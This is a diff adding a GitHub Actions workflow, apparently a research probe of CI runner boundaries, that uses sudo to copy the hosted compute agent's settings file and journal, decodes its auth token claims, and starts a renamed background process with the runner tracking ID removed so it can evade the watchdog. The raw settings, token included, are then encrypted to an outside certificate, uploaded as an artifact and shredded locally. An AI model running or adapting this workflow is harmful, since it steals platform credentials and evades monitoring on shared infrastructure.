@@ -1,0 +1,133 @@
+name: f004-watchdog-detection-boundary
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  owned-boundary:
+    strategy:
+      fail-fast: false
+      max-parallel: 3
+      matrix:
+        actor:
+          - A
+          - B
+          - C
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    env:
+      F004_ACTOR: ${{ matrix.actor }}
+      F004_CAPTURE_CERT: ${{ secrets.F004_CAPTURE_CERT }}
+    steps:
+      - name: Capture encrypted authority and live canary
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          test -n "$F004_CAPTURE_CERT"
+          raw="$RUNNER_TEMP/f004-watchdog-raw"
+          sealed="$RUNNER_TEMP/f004-watchdog-sealed"
+          mkdir -p "$raw" "$sealed"
+          sleep 5
+
+          canary_path="$RUNNER_TEMP/f004-$F004_ACTOR-canary"
+          cp /usr/bin/sleep "$canary_path"
+          chmod 700 "$canary_path"
+          env -u RUNNER_TRACKING_ID "$canary_path" 720 >/dev/null 2>&1 &
+          canary_pid=$!
+          sleep 1
+          kill -0 "$canary_pid"
+
+          sudo cp /opt/hca/.settings "$raw/hca.settings"
+          sudo journalctl --no-pager -u hosted-compute-agent > "$raw/hca-journal.txt" 2>&1 || true
+          sudo chown -R "$USER:$USER" "$raw"
+          printf '%s\n' "$GITHUB_RUN_ID:$F004_ACTOR:watchdog-detection-boundary" > "$raw/actor-canary.txt"
+          printf '%s\n' "$canary_pid" > "$raw/canary-pid.txt"
+          printf '%s\n' "$canary_path" > "$raw/canary-path.txt"
+          shasum -a 256 "$canary_path" > "$raw/canary-sha256.txt"
+          ps -o user,pid,ppid,stat,lstart,comm,args -p "$canary_pid" > "$raw/canary-process.txt"
+
+          python3 - "$raw" "$sealed/metadata.json" <<'PY'
+          import base64
+          import hashlib
+          import json
+          import os
+          import pathlib
+
+          raw = pathlib.Path(os.sys.argv[1])
+          output = pathlib.Path(os.sys.argv[2])
+          settings_bytes = (raw / 'hca.settings').read_bytes()
+          settings = json.loads(settings_bytes)
+          token = settings['authToken']
+          payload = token.split('.')[1]
+          payload += '=' * (-len(payload) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(payload))
+          orchestration_id = ''
+          for line in (raw / 'hca-journal.txt').read_text(errors='replace').splitlines():
+              start = line.find('{')
+              if start < 0:
+                  continue
+              try:
+                  record = json.loads(line[start:])
+              except json.JSONDecodeError:
+                  continue
+              if record.get('msg') == 'Processing request':
+                  orchestration_id = str(record.get('orchestration_id', ''))
+                  break
+          if not orchestration_id:
+              raise SystemExit('orchestration ID absent')
+          canary_pid = int((raw / 'canary-pid.txt').read_text().strip())
+          canary_path = (raw / 'canary-path.txt').read_text().strip()
+          report = {
+              'repository': os.environ['GITHUB_REPOSITORY'],
+              'run_id': os.environ['GITHUB_RUN_ID'],
+              'actor': os.environ['F004_ACTOR'],
+              'runner_name': os.environ['RUNNER_NAME'],
+              'mode': settings.get('mode'),
+              'token_environment': claims.get('env'),
+              'worker_id_sha256': hashlib.sha256(str(claims.get('wid', '')).encode()).hexdigest(),
+              'orchestration_id': orchestration_id,
+              'orchestration_id_sha256': hashlib.sha256(orchestration_id.encode()).hexdigest(),
+              'settings_sha256': hashlib.sha256(settings_bytes).hexdigest(),
+              'canary_pid': canary_pid,
+              'canary_path': canary_path,
+              'canary_process': f'f004-{os.environ["F004_ACTOR"]}-canary',
+          }
+          output.write_text(json.dumps(report, indent=2) + '\n')
+          print(json.dumps({key: value for key, value in report.items() if key != 'orchestration_id'}, indent=2))
+          PY
+
+          printf '%s\n' "$F004_CAPTURE_CERT" > "$RUNNER_TEMP/f004-certificate.pem"
+          tar -C "$raw" -cf "$RUNNER_TEMP/f004-watchdog.tar" .
+          openssl cms -encrypt -binary -aes-256-cbc \
+            -in "$RUNNER_TEMP/f004-watchdog.tar" \
+            -outform DER \
+            -out "$sealed/payload.cms" \
+            "$RUNNER_TEMP/f004-certificate.pem"
+          shasum -a 256 "$sealed/payload.cms" | awk '{print $1}' > "$sealed/payload.cms.sha256"
+          shred -u "$RUNNER_TEMP/f004-watchdog.tar" "$RUNNER_TEMP/f004-certificate.pem"
+          sudo rm -rf "$raw"
+
+      - name: Upload encrypted authority
+        uses: actions/upload-artifact@v4
+        with:
+          name: f004-watchdog-${{ matrix.actor }}-${{ github.run_id }}
+          path: ${{ runner.temp }}/f004-watchdog-sealed
+          retention-days: 1
+          compression-level: 0
+
+      - name: Hold controlled boundary canary live
+        shell: bash
+        run: |
+          set -euo pipefail
+          canary_path="$RUNNER_TEMP/f004-$F004_ACTOR-canary"
+          for index in $(seq 1 72); do
+            canary_pid=$(pgrep -o -f "^$canary_path 720$")
+            test -n "$canary_pid"
+            printf 'F004_HEARTBEAT actor=%s index=%s pid=%s timestamp=%s\n' \
+              "$F004_ACTOR" "$index" "$canary_pid" "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+            sleep 10
+          done
